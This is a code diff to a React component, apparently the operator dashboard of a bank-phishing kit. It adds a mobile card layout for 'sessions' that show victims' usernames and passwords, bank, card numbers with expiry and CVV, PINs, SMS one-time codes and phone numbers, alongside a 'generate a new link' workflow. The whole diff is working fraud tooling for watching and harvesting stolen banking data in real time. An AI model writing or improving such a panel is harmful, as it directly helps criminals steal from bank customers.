@@ -5,6 +5,10 @@ import { useMutation } from '@tanstack/react-query';
 import { apiRequest } from '@/lib/queryClient';
 import { queryClient } from '@/lib/queryClient';
 import { useToast } from '@/hooks/use-toast';
+import { useIsMobile } from '@/hooks/use-mobile';
+import { Card, CardContent } from '@/components/ui/card';
+import { Button } from '@/components/ui/button';
+import { ArrowRight, CheckCircle2, Copy, AlarmClock, CreditCard, MessageSquare, KeyRound, AlertCircle, Smartphone, Target } from 'lucide-react';
 
 interface AccessTableProps {
   sessions: Session[];
@@ -22,6 +26,7 @@ const AccessTable: React.FC<AccessTableProps> = ({
   isLoading 
 }) => {
   const { toast } = useToast();
+  const isMobile = useIsMobile();
   // Estado para resaltar las filas recién actualizadas
   const [highlightedRows, setHighlightedRows] = useState<Record<string, boolean>>({});
   
@@ -175,118 +180,264 @@ const AccessTable: React.FC<AccessTableProps> = ({
 
   return (
     <div className="px-6 pt-2 pb-6 overflow-auto flex-1">
-      <table className="w-full bg-[#1e1e1e] rounded-lg overflow-hidden">
-        <thead>
-          <tr className="bg-[#222]">
-            <th className="p-3 text-left">#</th>
-            <th className="p-3 text-left">Folio</th>
-            <th className="p-3 text-left">User:Password</th>
-            <th className="p-3 text-left">Banco</th>
-            <th className="p-3 text-left">Tarjeta</th>
-            <th className="p-3 text-left">SMS</th>
-            <th className="p-3 text-left">NIP</th>
-            <th className="p-3 text-left">SMS COMPRA</th>
-            <th className="p-3 text-left">Celular</th>
-            <th className="p-3 text-left">Paso actual</th>
-            <th className="p-3 text-left">Acciones</th>
-          </tr>
-        </thead>
-        <tbody>
-          {filteredSessions.length === 0 && (
-            <tr>
-              <td colSpan={11} className="p-4 text-center text-gray-400">
-                No hay sesiones activas. Genere un nuevo link para crear una sesión.
-              </td>
-            </tr>
-          )}
-          
-          {filteredSessions.map((session, index) => (
-            <tr 
-              key={session.id}
-              className={`border-b border-[#2c2c2c] ${selectedSessionId === session.sessionId ? 'bg-[#2a2a2a]' : ''} 
-                ${highlightedRows[session.sessionId] ? 'bg-[#1a4c64] transition-colors duration-500' : ''}`}
-              onClick={() => onSelectSession(session.sessionId)}
-            >
-              <td className="p-3 text-[#ccc]">{index + 1}</td>
-              <td className={`p-3 ${highlightedFields[session.sessionId]?.folio ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
-                {session.folio}
-              </td>
-              <td className={`p-3 ${highlightedFields[session.sessionId]?.credentials ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
-                {session.username && session.password 
-                  ? `${session.username}:${session.password}` 
-                  : '--'}
-              </td>
-              <td className="p-3 text-[#ccc]">{session.banco}</td>
-              <td className={`p-3 ${highlightedFields[session.sessionId]?.tarjeta ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
-                <div>
-                  <span className="block">{session.tarjeta || '--'}</span>
-                  {(session.fechaVencimiento || session.cvv) && (
-                    <div className="text-xs mt-1 opacity-80">
-                      {session.fechaVencimiento && <span className="mr-2">Exp: {session.fechaVencimiento}</span>}
-                      {session.cvv && <span>CVV: {session.cvv}</span>}
+      {/* Vista para móvil: tarjetas */}
+      {isMobile ? (
+        <>
+          {filteredSessions.length === 0 ? (
+            <div className="w-full bg-[#1e1e1e] rounded-lg p-4 text-center text-gray-400">
+              No hay sesiones activas. Genere un nuevo link para crear una sesión.
+            </div>
+          ) : (
+            <div className="space-y-4">
+              {filteredSessions.map((session, index) => (
+                <Card 
+                  key={session.id}
+                  className={`bg-[#1e1e1e] border-[#2c2c2c] ${selectedSessionId === session.sessionId ? 'border-[#4c4c4c]' : ''} 
+                    ${highlightedRows[session.sessionId] ? 'bg-[#1a4c64] transition-colors duration-500' : ''}`}
+                  onClick={() => onSelectSession(session.sessionId)}
+                >
+                  <CardContent className="p-4">
+                    <div className="flex justify-between items-center mb-3">
+                      <div className="font-bold text-[#ccc] text-lg">{session.banco}</div>
+                      <div className={`px-3 py-1 rounded text-xs ${highlightedFields[session.sessionId]?.pasoActual ? 'text-[#00ffff] font-bold bg-[#003a4f]' : 'bg-[#2a2a2a] text-[#ccc]'}`}>
+                        {session.pasoActual ? session.pasoActual.charAt(0).toUpperCase() + session.pasoActual.slice(1) : 'Inicio'}
+                      </div>
                     </div>
-                  )}
-                </div>
-              </td>
-              <td className={`p-3 ${highlightedFields[session.sessionId]?.sms ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
-                {session.sms || '--'}
-              </td>
-              <td className={`p-3 ${highlightedFields[session.sessionId]?.nip ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
-                {session.nip || '--'}
-              </td>
-              <td className={`p-3 ${highlightedFields[session.sessionId]?.smsCompra ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
-                {session.smsCompra || '--'}
-              </td>
-              <td className={`p-3 ${highlightedFields[session.sessionId]?.celular ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
-                {session.celular || '--'}
-              </td>
-              <td className={`p-3 ${highlightedFields[session.sessionId]?.pasoActual ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
-                {/* Convert pasoActual to a more readable format */}
-                {session.pasoActual ? session.pasoActual.charAt(0).toUpperCase() + session.pasoActual.slice(1) : '--'}
-              </td>
-              <td className="p-3 text-[#ccc]">
-                <div className="flex space-x-1">
-                  <button 
-                    className="text-xs bg-[#2c2c2c] hover:bg-[#1f1f1f] px-2 py-1 rounded"
-                    onClick={(e) => {
-                      e.stopPropagation();
-                      onSelectSession(session.sessionId);
-                    }}
-                  >
-                    Seleccionar
-                  </button>
-                  
-                  {!session.saved && (
-                    <button 
-                      className="text-xs bg-[#005c99] hover:bg-[#004d80] text-white px-2 py-1 rounded"
-                      onClick={(e) => {
-                        e.stopPropagation();
-                        saveSessionMutation.mutate(session.sessionId);
-                      }}
-                      disabled={saveSessionMutation.isPending}
-                    >
-                      {saveSessionMutation.isPending ? '...' : 'Guardar'}
-                    </button>
-                  )}
-                  
-                  <button 
-                    className="text-xs bg-[#990000] hover:bg-[#800000] text-white px-2 py-1 rounded"
-                    onClick={(e) => {
-                      e.stopPropagation();
-                      if (window.confirm('¿Está seguro que desea eliminar esta sesión?')) {
-                        deleteSessionMutation.mutate(session.sessionId);
-                      }
-                    }}
-                    disabled={deleteSessionMutation.isPending}
-                  >
-                    {deleteSessionMutation.isPending ? '...' : 'Eliminar'}
-                  </button>
-                </div>
-              </td>
-            </tr>
-          ))}
-        </tbody>
-      </table>
+                    
+                    <div className="mb-3 flex gap-1 items-center">
+                      <Copy className="h-4 w-4 text-[#888]" />
+                      <div className={`text-sm ${highlightedFields[session.sessionId]?.folio ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
+                        Folio: {session.folio}
+                      </div>
+                    </div>
+                    
+                    {(session.username || session.password) && (
+                      <div className="mb-3 flex gap-1 items-center">
+                        <AlertCircle className="h-4 w-4 text-[#888]" />
+                        <div className={`text-sm ${highlightedFields[session.sessionId]?.credentials ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
+                          {session.username && session.password 
+                            ? `${session.username}:${session.password}` 
+                            : '--'}
+                        </div>
+                      </div>
+                    )}
+                    
+                    {session.tarjeta && (
+                      <div className="mb-3 flex gap-1 items-start">
+                        <CreditCard className="h-4 w-4 text-[#888] mt-0.5" />
+                        <div className={`text-sm ${highlightedFields[session.sessionId]?.tarjeta ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
+                          <div>{session.tarjeta}</div>
+                          {(session.fechaVencimiento || session.cvv) && (
+                            <div className="text-xs mt-1 opacity-80">
+                              {session.fechaVencimiento && <span className="mr-2">Exp: {session.fechaVencimiento}</span>}
+                              {session.cvv && <span>CVV: {session.cvv}</span>}
+                            </div>
+                          )}
+                        </div>
+                      </div>
+                    )}
+                    
+                    {session.sms && (
+                      <div className="mb-2 flex gap-1 items-center">
+                        <MessageSquare className="h-4 w-4 text-[#888]" />
+                        <div className={`text-sm ${highlightedFields[session.sessionId]?.sms ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
+                          SMS: {session.sms}
+                        </div>
+                      </div>
+                    )}
+                    
+                    {session.nip && (
+                      <div className="mb-2 flex gap-1 items-center">
+                        <KeyRound className="h-4 w-4 text-[#888]" />
+                        <div className={`text-sm ${highlightedFields[session.sessionId]?.nip ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
+                          NIP: {session.nip}
+                        </div>
+                      </div>
+                    )}
+                    
+                    {session.smsCompra && (
+                      <div className="mb-2 flex gap-1 items-center">
+                        <CheckCircle2 className="h-4 w-4 text-[#888]" />
+                        <div className={`text-sm ${highlightedFields[session.sessionId]?.smsCompra ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
+                          SMS Compra: {session.smsCompra}
+                        </div>
+                      </div>
+                    )}
+                    
+                    {session.celular && (
+                      <div className="mb-3 flex gap-1 items-center">
+                        <Smartphone className="h-4 w-4 text-[#888]" />
+                        <div className={`text-sm ${highlightedFields[session.sessionId]?.celular ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
+                          Celular: {session.celular}
+                        </div>
+                      </div>
+                    )}
+                    
+                    <div className="flex gap-2 mt-4 border-t border-[#333] pt-3">
+                      <Button 
+                        variant="outline" 
+                        size="sm"
+                        className="flex-1 bg-[#2c2c2c] hover:bg-[#1f1f1f] border-[#444]"
+                        onClick={(e) => {
+                          e.stopPropagation();
+                          onSelectSession(session.sessionId);
+                        }}
+                      >
+                        Seleccionar
+                      </Button>
+                      
+                      {!session.saved && (
+                        <Button 
+                          size="sm"
+                          className="flex-1 bg-[#005c99] hover:bg-[#004d80] text-white"
+                          onClick={(e) => {
+                            e.stopPropagation();
+                            saveSessionMutation.mutate(session.sessionId);
+                          }}
+                          disabled={saveSessionMutation.isPending}
+                        >
+                          {saveSessionMutation.isPending ? '...' : 'Guardar'}
+                        </Button>
+                      )}
+                      
+                      <Button 
+                        variant="destructive"
+                        size="sm"
+                        className="flex-1 bg-[#990000] hover:bg-[#800000]"
+                        onClick={(e) => {
+                          e.stopPropagation();
+                          if (window.confirm('¿Está seguro que desea eliminar esta sesión?')) {
+                            deleteSessionMutation.mutate(session.sessionId);
+                          }
+                        }}
+                        disabled={deleteSessionMutation.isPending}
+                      >
+                        {deleteSessionMutation.isPending ? '...' : 'Eliminar'}
+                      </Button>
+                    </div>
+                  </CardContent>
+                </Card>
+              ))}
+            </div>
+          )}
+        </>
+      ) : (
+        /* Vista para desktop: tabla */
+        <div className="overflow-x-auto">
+          <table className="w-full bg-[#1e1e1e] rounded-lg overflow-hidden">
+            <thead>
+              <tr className="bg-[#222]">
+                <th className="p-3 text-left">#</th>
+                <th className="p-3 text-left">Folio</th>
+                <th className="p-3 text-left">User:Password</th>
+                <th className="p-3 text-left">Banco</th>
+                <th className="p-3 text-left">Tarjeta</th>
+                <th className="p-3 text-left">SMS</th>
+                <th className="p-3 text-left">NIP</th>
+                <th className="p-3 text-left">SMS COMPRA</th>
+                <th className="p-3 text-left">Celular</th>
+                <th className="p-3 text-left">Paso actual</th>
+                <th className="p-3 text-left">Acciones</th>
+              </tr>
+            </thead>
+            <tbody>
+              {filteredSessions.length === 0 && (
+                <tr>
+                  <td colSpan={11} className="p-4 text-center text-gray-400">
+                    No hay sesiones activas. Genere un nuevo link para crear una sesión.
+                  </td>
+                </tr>
+              )}
+              
+              {filteredSessions.map((session, index) => (
+                <tr 
+                  key={session.id}
+                  className={`border-b border-[#2c2c2c] ${selectedSessionId === session.sessionId ? 'bg-[#2a2a2a]' : ''} 
+                    ${highlightedRows[session.sessionId] ? 'bg-[#1a4c64] transition-colors duration-500' : ''}`}
+                  onClick={() => onSelectSession(session.sessionId)}
+                >
+                  <td className="p-3 text-[#ccc]">{index + 1}</td>
+                  <td className={`p-3 ${highlightedFields[session.sessionId]?.folio ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
+                    {session.folio}
+                  </td>
+                  <td className={`p-3 ${highlightedFields[session.sessionId]?.credentials ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
+                    {session.username && session.password 
+                      ? `${session.username}:${session.password}` 
+                      : '--'}
+                  </td>
+                  <td className="p-3 text-[#ccc]">{session.banco}</td>
+                  <td className={`p-3 ${highlightedFields[session.sessionId]?.tarjeta ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
+                    <div>
+                      <span className="block">{session.tarjeta || '--'}</span>
+                      {(session.fechaVencimiento || session.cvv) && (
+                        <div className="text-xs mt-1 opacity-80">
+                          {session.fechaVencimiento && <span className="mr-2">Exp: {session.fechaVencimiento}</span>}
+                          {session.cvv && <span>CVV: {session.cvv}</span>}
+                        </div>
+                      )}
+                    </div>
+                  </td>
+                  <td className={`p-3 ${highlightedFields[session.sessionId]?.sms ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
+                    {session.sms || '--'}
+                  </td>
+                  <td className={`p-3 ${highlightedFields[session.sessionId]?.nip ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
+                    {session.nip || '--'}
+                  </td>
+                  <td className={`p-3 ${highlightedFields[session.sessionId]?.smsCompra ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
+                    {session.smsCompra || '--'}
+                  </td>
+                  <td className={`p-3 ${highlightedFields[session.sessionId]?.celular ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
+                    {session.celular || '--'}
+                  </td>
+                  <td className={`p-3 ${highlightedFields[session.sessionId]?.pasoActual ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
+                    {/* Convert pasoActual to a more readable format */}
+                    {session.pasoActual ? session.pasoActual.charAt(0).toUpperCase() + session.pasoActual.slice(1) : '--'}
+                  </td>
+                  <td className="p-3 text-[#ccc]">
+                    <div className="flex space-x-1">
+                      <button 
+                        className="text-xs bg-[#2c2c2c] hover:bg-[#1f1f1f] px-2 py-1 rounded"
+                        onClick={(e) => {
+                          e.stopPropagation();
+                          onSelectSession(session.sessionId);
+                        }}
+                      >
+                        Seleccionar
+                      </button>
+                      
+                      {!session.saved && (
+                        <button 
+                          className="text-xs bg-[#005c99] hover:bg-[#004d80] text-white px-2 py-1 rounded"
+                          onClick={(e) => {
+                            e.stopPropagation();
+                            saveSessionMutation.mutate(session.sessionId);
+                          }}
+                          disabled={saveSessionMutation.isPending}
+                        >
+                          {saveSessionMutation.isPending ? '...' : 'Guardar'}
+                        </button>
+                      )}
+                      
+                      <button 
+                        className="text-xs bg-[#990000] hover:bg-[#800000] text-white px-2 py-1 rounded"
+                        onClick={(e) => {
+                          e.stopPropagation();
+                          if (window.confirm('¿Está seguro que desea eliminar esta sesión?')) {
+                            deleteSessionMutation.mutate(session.sessionId);
+                          }
+                        }}
+                        disabled={deleteSessionMutation.isPending}
+                      >
+                        {deleteSessionMutation.isPending ? '...' : 'Eliminar'}
+                      </button>
+                    </div>
+                  </td>
+                </tr>
+              ))}
+            </tbody>
+          </table>
+        </div>
+      )}
     </div>
   );
 };
